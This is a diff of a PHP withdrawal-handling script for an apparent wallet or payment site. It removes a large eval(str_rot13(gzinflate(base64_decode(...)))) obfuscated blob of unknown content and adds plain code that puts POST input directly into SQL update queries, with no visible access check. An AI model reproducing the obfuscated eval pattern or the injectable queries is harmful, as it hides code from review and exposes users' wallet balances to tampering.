@@ -1,4 +1,32 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+include('include/connection.php');
 
+if(isset($_POST['type']))
+{
+$id=$_POST['id'];
+$today=date( 'Y-m-d H:i:s' );
+$actiontype='withdraw~'.$id;	
+
+if($_POST['type']=='accept'){
+
+	 $sqlA = mysqli_query($con,"Update `tbl_withdrawal` set status = '0',createdate = '".$today."' where `id`='".$id."' ");
+			
+$sqlAA = mysqli_query($con,"Update `tbl_walletsummery` set createdate = '".$today."' where `actiontype`='".$actiontype."' ");
+
+			
+}else if($_POST['type']=='reject') 
+{
+$sqlA = mysqli_query($con,"Update `tbl_withdrawal` set status = '2',createdate = '".$today."' where `id`='".$id."'");
+$useridQuery=mysqli_query($con,"select `userid`,`amount` from `tbl_withdrawal` where `id`='".$id."'");
+$userResult=mysqli_fetch_array($useridQuery);
+$userid=$userResult['userid'];
+$amount=$userResult['amount'];
+$walletbalance=wallet($con,'amount',$userid);
+$finalbalanceCredit=$walletbalance+$amount;	
+$sqlwallet= mysqli_query($con,"UPDATE `tbl_wallet` SET `amount` = '$finalbalanceCredit' WHERE `userid`= '$userid'");	
+
+	}
+
+
+	}
 ?>
